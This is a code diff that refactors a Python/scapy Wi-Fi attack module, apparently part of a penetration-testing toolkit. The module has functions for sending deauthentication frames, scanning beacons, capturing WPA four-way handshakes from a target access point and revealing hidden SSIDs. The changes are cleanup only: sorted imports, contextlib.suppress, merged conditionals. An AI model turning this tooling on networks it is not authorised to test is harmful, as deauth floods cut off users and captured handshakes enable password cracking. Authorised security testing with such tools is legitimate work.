@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import contextlib
 import random
 import time
 from dataclasses import dataclass
@@ -13,9 +14,17 @@ console = Console()
 
 try:
     from scapy.all import (
-        RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt,
-        Dot11ProbeReq, Dot11ProbeResp, Dot11Auth, Dot11AssoReq,
-        EAPOL, sendp, sniff, wrpcap, conf,
+        EAPOL,
+        Dot11,
+        Dot11Beacon,
+        Dot11Deauth,
+        Dot11Elt,
+        Dot11ProbeReq,
+        Dot11ProbeResp,
+        RadioTap,
+        sendp,
+        sniff,
+        wrpcap,
     )
     SCAPY_AVAILABLE = True
 except ImportError:
@@ -65,7 +74,7 @@ def deauth(
     )
 
     sent = 0
-    for i in range(count):
+    for _i in range(count):
         sendp(pkt_to_client, iface=interface, verbose=False)
         sendp(pkt_to_ap, iface=interface, verbose=False)
         sent += 2
@@ -136,15 +145,11 @@ def scan_beacons(
         elt = pkt[Dot11Elt]
         while elt:
             if elt.ID == 0:
-                try:
+                with contextlib.suppress(Exception):
                     essid = elt.info.decode("utf-8", errors="ignore")
-                except Exception:
-                    pass
             elif elt.ID == 3:
-                try:
+                with contextlib.suppress(Exception):
                     channel = int.from_bytes(elt.info, "big")
-                except Exception:
-                    pass
             elt = elt.payload if hasattr(elt.payload, "ID") else None
 
         power = getattr(pkt, "dBm_AntSignal", -100) if hasattr(pkt, "dBm_AntSignal") else -100
@@ -182,11 +187,10 @@ def capture_handshake(
 
     def process_packet(pkt):
         nonlocal eapol_count
-        if pkt.haslayer(EAPOL):
-            if pkt[Dot11].addr1 == bssid or pkt[Dot11].addr2 == bssid:
-                handshake_packets.append(pkt)
-                eapol_count += 1
-                console.print(f"[green]EAPOL frame {eapol_count}/4 captured[/green]")
+        if pkt.haslayer(EAPOL) and (pkt[Dot11].addr1 == bssid or pkt[Dot11].addr2 == bssid):
+            handshake_packets.append(pkt)
+            eapol_count += 1
+            console.print(f"[green]EAPOL frame {eapol_count}/4 captured[/green]")
 
     with Progress(
         SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
@@ -227,17 +231,16 @@ def detect_hidden_ssid(
         if found_ssid:
             return
 
-        if pkt.haslayer(Dot11ProbeResp):
-            if pkt[Dot11].addr2 == bssid:
-                elt = pkt[Dot11ProbeResp].payload
-                if hasattr(elt, "ID") and elt.ID == 0:
-                    try:
-                        ssid = elt.info.decode("utf-8", errors="ignore")
-                        if ssid:
-                            found_ssid = ssid
-                            console.print(f"[green bold]Hidden SSID revealed: {ssid}[/green bold]")
-                    except Exception:
-                        pass
+        if pkt.haslayer(Dot11ProbeResp) and pkt[Dot11].addr2 == bssid:
+            elt = pkt[Dot11ProbeResp].payload
+            if hasattr(elt, "ID") and elt.ID == 0:
+                try:
+                    ssid = elt.info.decode("utf-8", errors="ignore")
+                    if ssid:
+                        found_ssid = ssid
+                        console.print(f"[green bold]Hidden SSID revealed: {ssid}[/green bold]")
+                except Exception:
+                    pass
 
     sniff(
         iface=interface, prn=process_packet,
